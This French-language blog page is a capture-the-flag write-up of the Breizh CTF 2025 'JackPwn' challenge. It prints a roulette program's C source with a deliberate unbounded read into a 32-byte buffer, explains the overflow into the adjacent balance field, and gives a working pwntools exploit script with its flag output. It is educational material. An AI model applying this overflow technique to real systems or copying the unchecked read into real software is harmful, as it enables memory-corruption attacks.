<!DOCTYPE html>
<html lang="fr-fr">
<head><script src="/cybersecurity-notes/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=cybersecurity-notes/livereload" data-no-instant defer></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Breizh CTF 2025 - JackPwn | WriteUps &amp; Recherches Cybersécurité</title>
    <meta name="description" content="JackPwn - Breizh CTF 2025 Description du challenge JackPwn est un challenge de la catégorie Pwn du Breizh CTF 2025. Il simule un jeu de roulette avec une vulnérabilité de buffer overflow.
Analyse du binaire Voici le code source du binaire :
#include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;time.h&gt; #define MISE 2 const char roulette[] = &#34;xRNRNRNRNRNNRNRNRNRRNRNRNRNRNNRNRNRNR&#34;; void read_input(char *buf) { char c; while (1) { c = getchar(); if (c == &#39;\n&#39;) { *(buf&#43;&#43;) = 0; break; } else if (c == EOF) { exit(0); } *(buf&#43;&#43;) = c; } } int get_random_number() { return 1 &#43; (random() % 36); } int main() { int bille; char gagne; char valide, rouge, noir, pair, impair; struct { char mise[32]; int solde; } ctx; ctx.">
    
    
    <meta property="og:title" content="Breizh CTF 2025 - JackPwn">
    <meta property="og:description" content="JackPwn - Breizh CTF 2025 Description du challenge JackPwn est un challenge de la catégorie Pwn du Breizh CTF 2025. Il simule un jeu de roulette avec une vulnérabilité de buffer overflow.
Analyse du binaire Voici le code source du binaire :
#include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;time.h&gt; #define MISE 2 const char roulette[] = &#34;xRNRNRNRNRNNRNRNRNRRNRNRNRNRNNRNRNRNR&#34;; void read_input(char *buf) { char c; while (1) { c = getchar(); if (c == &#39;\n&#39;) { *(buf&#43;&#43;) = 0; break; } else if (c == EOF) { exit(0); } *(buf&#43;&#43;) = c; } } int get_random_number() { return 1 &#43; (random() % 36); } int main() { int bille; char gagne; char valide, rouge, noir, pair, impair; struct { char mise[32]; int solde; } ctx; ctx.">
    <meta property="og:type" content="article">
    <meta property="og:url" content="http://localhost:1313/cybersecurity-notes/writeups/breizh-ctf/2024-04-14-breizh-jackpwn/">
    
    
    <link rel="icon" type="image/svg+xml" href="/cybersecurity-notes/images/favicon.svg">
    <link rel="icon" type="image/png" href="/cybersecurity-notes/images/favicon.png">
    
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-dark.min.css">
    
    
    <link rel="stylesheet" href="/cybersecurity-notes/css/main.css">
    <link rel="stylesheet" href="/cybersecurity-notes/css/custom.css">
    <link rel="stylesheet" href="/cybersecurity-notes/css/dropdown.css">
    <link rel="stylesheet" href="/cybersecurity-notes/css/enhanced.css">
    
    
    
    
    <script src="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/lib/highlight.min.js"></script>
    
    
    <script src="/cybersecurity-notes/js/copy-code.js" defer></script>
    <script src="/cybersecurity-notes/js/enhanced.js" defer></script>
</head>
<body>
    <nav class="navbar">
        <div class="nav-content">
            <a href="http://localhost:1313/cybersecurity-notes/" class="nav-brand">
                <i class="fas fa-shield-alt"></i> WriteUps &amp; Recherches Cybersécurité
            </a>
            <div class="nav-links">
                
                
                <a href="http://localhost:1313/cybersecurity-notes/writeups/" class="nav-link">
                    
                        <i class="fas fa-flag"></i>
                    
                    WriteUps
                </a>
                
                
                
                <a href="http://localhost:1313/cybersecurity-notes/veille/" class="nav-link">
                    
                        <i class="fas fa-rss"></i>
                    
                    Veille
                </a>
                
                
                
                <a href="http://localhost:1313/cybersecurity-notes/outils/" class="nav-link">
                    
                        <i class="fas fa-tools"></i>
                    
                    Outils
                </a>
                
                
            </div>
        </div>
    </nav>
</body>
</html> 
<main class="content">
    
<article class="single-page">
    <header class="page-header">
        <div class="breadcrumbs">
            <a href="http://localhost:1313/cybersecurity-notes/">Accueil</a> &gt;
            
            
            <a href="/categories/pwn">pwn</a> &gt;
            
            
            <span>Breizh CTF 2025 - JackPwn</span>
        </div>
        
        <h1>Breizh CTF 2025 - JackPwn</h1>
        
        <div class="meta">
            <div class="meta-item">
                <i class="far fa-calendar-alt"></i>
                <span>14/04/2024</span>
            </div>
            
            
            <div class="meta-item">
                <i class="fas fa-tags"></i>
                <div class="tags">
                    
                    <a href="/tags/buffer-overflow" class="tag">buffer-overflow</a>
                    
                    <a href="/tags/exploitation" class="tag">exploitation</a>
                    
                </div>
            </div>
            
            
            
            <div class="meta-item">
                <i class="fas fa-flag"></i>
                <div class="tags">
                    
                    <a href="/ctfs/breizh-ctf" class="tag">breizh-ctf</a>
                    
                </div>
            </div>
            
            
            <div class="meta-item reading-time">
                <i class="far fa-clock"></i>
                <span>4 min</span>
            </div>
        </div>
    </header>
    
    
    <div class="toc-container">
        <div class="toc-header">
            <i class="fas fa-list"></i> Table des matières
        </div>
        <div class="toc-content">
            <nav id="TableOfContents">
  <ul>
    <li><a href="#description-du-challenge">Description du challenge</a></li>
    <li><a href="#analyse-du-binaire">Analyse du binaire</a></li>
    <li><a href="#vulnérabilité">Vulnérabilité</a></li>
    <li><a href="#exploitation">Exploitation</a></li>
    <li><a href="#flag">Flag</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
        </div>
    </div>
    
    
    <div class="content">
        <h1 id="jackpwn---breizh-ctf-2025">JackPwn - Breizh CTF 2025</h1>
<h2 id="description-du-challenge">Description du challenge</h2>
<p>JackPwn est un challenge de la catégorie Pwn du Breizh CTF 2025. Il simule un jeu de roulette avec une vulnérabilité de buffer overflow.</p>
<h2 id="analyse-du-binaire">Analyse du binaire</h2>
<p>Voici le code source du binaire :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MISE 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> roulette[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;xRNRNRNRNRNNRNRNRNRRNRNRNRNRNNRNRNRNR&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">read_input</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> c;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        c <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>(buf<span style="color:#f92672">++</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">==</span> EOF) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(buf<span style="color:#f92672">++</span>) <span style="color:#f92672">=</span> c;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">get_random_number</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> (<span style="color:#a6e22e">random</span>() <span style="color:#f92672">%</span> <span style="color:#ae81ff">36</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> bille;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> gagne;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> valide, rouge, noir, pair, impair;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> mise[<span style="color:#ae81ff">32</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> solde;
</span></span><span style="display:flex;"><span>    } ctx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ctx.solde <span style="color:#f92672">=</span> <span style="color:#ae81ff">50</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">srand</span>(<span style="color:#a6e22e">time</span>(NULL));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (ctx.solde <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        valide <span style="color:#f92672">=</span> rouge <span style="color:#f92672">=</span> noir <span style="color:#f92672">=</span> pair <span style="color:#f92672">=</span> impair <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        gagne <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Solde : %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ctx.solde);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Votre mise : &#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fflush</span>(stdout);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">read_input</span>(ctx.mise);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(ctx.mise, <span style="color:#e6db74">&#34;rouge&#34;</span>)) {
</span></span><span style="display:flex;"><span>                valide <span style="color:#f92672">=</span> rouge <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(ctx.mise, <span style="color:#e6db74">&#34;noir&#34;</span>)) {
</span></span><span style="display:flex;"><span>                valide <span style="color:#f92672">=</span> noir <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(ctx.mise, <span style="color:#e6db74">&#34;pair&#34;</span>)) {
</span></span><span style="display:flex;"><span>                valide <span style="color:#f92672">=</span> pair <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(ctx.mise, <span style="color:#e6db74">&#34;impair&#34;</span>)) {
</span></span><span style="display:flex;"><span>                valide <span style="color:#f92672">=</span> impair <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Mise invalide&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>valide);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        bille <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_random_number</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;La bille s&#39;est stoppée sur la case %d (%c)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bille, roulette[bille]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (rouge <span style="color:#f92672">&amp;&amp;</span> roulette[bille] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;R&#39;</span>) {
</span></span><span style="display:flex;"><span>            gagne <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (noir <span style="color:#f92672">&amp;&amp;</span> roulette[bille] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;N&#39;</span>) {
</span></span><span style="display:flex;"><span>            gagne <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (pair <span style="color:#f92672">&amp;&amp;</span> ((bille <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;pair&#34;</span>);
</span></span><span style="display:flex;"><span>            gagne <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (impair <span style="color:#f92672">&amp;&amp;</span> ((bille <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;impair&#34;</span>);
</span></span><span style="display:flex;"><span>            gagne <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            gagne <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (gagne) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Gagné&#34;</span>);
</span></span><span style="display:flex;"><span>            ctx.solde <span style="color:#f92672">+=</span> MISE;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Perdu&#34;</span>);
</span></span><span style="display:flex;"><span>            ctx.solde <span style="color:#f92672">-=</span> MISE;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ctx.solde <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x1337</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>flag <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;FLAG&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (flag <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;fake_flag&#34;</span>);
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">puts</span>(flag);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Après analyse, on peut identifier plusieurs points clés :</p>
<ol>
<li>Le programme simule un jeu de roulette où le joueur peut miser sur &ldquo;rouge&rdquo;, &ldquo;noir&rdquo;, &ldquo;pair&rdquo; ou &ldquo;impair&rdquo;</li>
<li>Une structure <code>ctx</code> contient deux éléments :
<ul>
<li><code>mise[32]</code> : un buffer de 32 octets pour stocker la mise</li>
<li><code>solde</code> : un entier qui représente l&rsquo;argent du joueur</li>
</ul>
</li>
<li>Le flag est affiché uniquement si le solde atteint exactement 0x1337 (4919 en décimal)</li>
<li>La fonction <code>read_input()</code> lit des caractères jusqu&rsquo;à rencontrer un retour à la ligne, sans vérifier la taille du buffer</li>
<li>Avec un solde initial de 50 et des gains/pertes de seulement 2, il faudrait énormément de parties pour atteindre 4919</li>
</ol>
<h2 id="vulnérabilité">Vulnérabilité</h2>
<p>La vulnérabilité principale est un buffer overflow classique dans la fonction <code>read_input()</code> :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">read_input</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> c;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        c <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>(buf<span style="color:#f92672">++</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">==</span> EOF) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(buf<span style="color:#f92672">++</span>) <span style="color:#f92672">=</span> c;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Cette fonction ne vérifie pas la taille du buffer et continue d&rsquo;écrire tant qu&rsquo;elle ne rencontre pas un retour à la ligne. De plus, lors de l&rsquo;appel à cette fonction, le buffer passé en paramètre est <code>ctx.mise</code>, qui ne fait que 32 octets. Si on entre plus de 32 caractères, on débordera sur le champ <code>solde</code> qui se trouve juste après dans la mémoire.</p>
<h2 id="exploitation">Exploitation</h2>
<p>La stratégie d&rsquo;exploitation est simple :</p>
<ol>
<li>Remplir les 32 octets du buffer <code>mise</code></li>
<li>Écrire en plus exactement les 4 octets de la valeur 0x1337 (4919) dans <code>solde</code></li>
<li>La valeur sera considérée comme valide car le buffer se termine par un 0 (ajouté par <code>read_input</code>)</li>
</ol>
<p>Voici comment exploiter cette vulnérabilité :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Connexion au serveur distant</span>
</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;jackpwn.chall.ctf.bzh&#39;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Création du payload</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>  <span style="color:#75715e"># Remplir le buffer mise</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x1337</span>)  <span style="color:#75715e"># Écrire 0x1337 dans solde</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attente du prompt et envoi du payload</span>
</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Votre mise : &#34;</span>)
</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Affichage du résultat</span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>print(response)
</span></span></code></pre></div><h2 id="flag">Flag</h2>
<p>Après exécution de l&rsquo;exploit, le programme détecte que le solde est exactement 0x1337 et affiche le flag :</p>
<pre tabindex="0"><code>$ python3 exploit.py
[+] Opening connection to jackpwn.chall.ctf.bzh on port 1337: Done
[+] Receiving all data: Done
[*] Closed connection to jackpwn.chall.ctf.bzh port 1337
Mise invalide
Solde : 4919
Votre mise : 
BZHCTF{j4ckp0t_0v3rfl0w_ftw}
</code></pre><h2 id="conclusion">Conclusion</h2>
<p>JackPwn est un exercice classique de buffer overflow visant à modifier une variable adjacente en mémoire. La vulnérabilité est dans la fonction <code>read_input()</code> qui n&rsquo;effectue aucune vérification de la taille du buffer, permettant ainsi d&rsquo;écrire au-delà des limites du tableau <code>mise</code> et de modifier directement la valeur de <code>solde</code> pour atteindre la condition de victoire.</p>

    </div>
    
    <div class="page-footer">
        
        
        <div class="related-posts">
            <h3><i class="fas fa-link"></i> Articles connexes</h3>
            <div class="related-grid">
                
                <a href="/cybersecurity-notes/writeups/pwnme-junior/2024-04-14-pwnme-overflowme/" class="related-item">
                    <h4>PwnMe Junior 2025 - Overflowme</h4>
                    <div class="related-meta">
                        <span class="related-date">14/04/2024</span>
                        
                        <span class="related-tags">
                            
                            <span class="tag">buffer-overflow</span>
                            
                        </span>
                        
                    </div>
                </a>
                
                <a href="/cybersecurity-notes/writeups/breizh-ctf/2024-04-14-breizh-metamorph/" class="related-item">
                    <h4>Breizh CTF 2025 - Metamorph</h4>
                    <div class="related-meta">
                        <span class="related-date">14/04/2024</span>
                        
                        <span class="related-tags">
                            
                            <span class="tag">shellcode</span>
                            
                        </span>
                        
                    </div>
                </a>
                
                <a href="/cybersecurity-notes/writeups/pwnme-junior/2024-04-14-pwnme-evilhackers/" class="related-item">
                    <h4>PwnMe Junior 2025 - Evil Hackers</h4>
                    <div class="related-meta">
                        <span class="related-date">14/04/2024</span>
                        
                        <span class="related-tags">
                            
                            <span class="tag">use-after-free</span>
                            
                        </span>
                        
                    </div>
                </a>
                
            </div>
        </div>
        
        
        <div class="share">
            <span>Partager :</span>
            <a href="https://twitter.com/intent/tweet?url=http%3a%2f%2flocalhost%3a1313%2fcybersecurity-notes%2fwriteups%2fbreizh-ctf%2f2024-04-14-breizh-jackpwn%2f&text=Breizh%20CTF%202025%20-%20JackPwn" target="_blank" aria-label="Twitter">
                <i class="fab fa-twitter"></i>
            </a>
            <a href="https://www.linkedin.com/sharing/share-offsite/?url=http%3a%2f%2flocalhost%3a1313%2fcybersecurity-notes%2fwriteups%2fbreizh-ctf%2f2024-04-14-breizh-jackpwn%2f" target="_blank" aria-label="LinkedIn">
                <i class="fab fa-linkedin"></i>
            </a>
            <a href="mailto:?subject=Breizh%20CTF%202025%20-%20JackPwn&body=http%3a%2f%2flocalhost%3a1313%2fcybersecurity-notes%2fwriteups%2fbreizh-ctf%2f2024-04-14-breizh-jackpwn%2f" aria-label="Email">
                <i class="fas fa-envelope"></i>
            </a>
        </div>
    </div>
</article>

</main>
    <footer class="footer">
        <div class="footer-content">
            <div class="footer-left">
                <p>&copy; 2025 WriteUps &amp; Recherches Cybersécurité</p>
            </div>
            <div class="footer-right">
                <div class="social-links">
                    <a href="https://github.com/Istaarkk" target="_blank" aria-label="GitHub">
                        <i class="fab fa-github"></i>
                    </a>
                    <a href="#" target="_blank" aria-label="Twitter">
                        <i class="fab fa-twitter"></i>
                    </a>
                    <a href="#" target="_blank" aria-label="LinkedIn">
                        <i class="fab fa-linkedin"></i>
                    </a>
                </div>
            </div>
        </div>
        <div class="footer-bottom">
            <p>Site propulsé par <a href="https://gohugo.io/" target="_blank">Hugo</a> | Thème <span class="theme-name">CyberNotes</span></p>
        </div>
    </footer>

    
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        
        hljs.highlightAll();
        
        
        document.querySelectorAll('pre code').forEach((block) => {
            const button = document.createElement('button');
            button.className = 'copy-button';
            button.textContent = 'Copier';
            
            const pre = block.parentNode;
            pre.style.position = 'relative';
            pre.insertBefore(button, pre.firstChild);
            
            button.addEventListener('click', () => {
                navigator.clipboard.writeText(block.textContent);
                button.textContent = 'Copié !';
                setTimeout(() => {
                    button.textContent = 'Copier';
                }, 2000);
            });
        });
        
        
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                
                document.querySelector(this.getAttribute('href')).scrollIntoView({
                    behavior: 'smooth'
                });
            });
        });
    });
    </script>
    
    
</body>
</html>  